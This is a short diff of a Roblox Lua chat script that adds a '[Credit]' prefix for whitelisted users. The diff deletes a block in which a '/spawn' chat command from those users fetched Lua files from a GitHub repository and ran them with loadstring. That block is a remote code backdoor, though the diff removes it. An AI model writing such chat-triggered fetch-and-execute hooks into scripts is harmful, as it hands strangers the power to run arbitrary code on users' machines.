@@ -20,18 +20,6 @@ TextChatService.OnIncomingMessage = function(msg)
         local username = msg.TextSource.Name
         if isWhitelisted(username) then
             p.PrefixText = "<font color='#0000FF'>[Credit]</font> " .. msg.PrefixText
-            
-            -- Check for admin commands
-            if msg.Text:sub(1, 7) == "/spawn " then
-                local command = msg.Text:sub(8)
-                if command == "dg" then
-                    loadstring(game.HttpGet("https://github.com/XiaoFenHG/DOORS/blob/main/der.lua?raw=true"))()
-                elseif command == "sug" then
-                    loadstring(game.HttpGet("https://github.com/XiaoFenHG/DOORS/blob/main/sug.lua?raw=true"))()
-                elseif command == "sk" then
-                    loadstring(game.HttpGet("https://github.com/XiaoFenHG/DOORS/blob/main/nah.lua?raw=true"))()
-                end
-            end
         end
     end
     return p
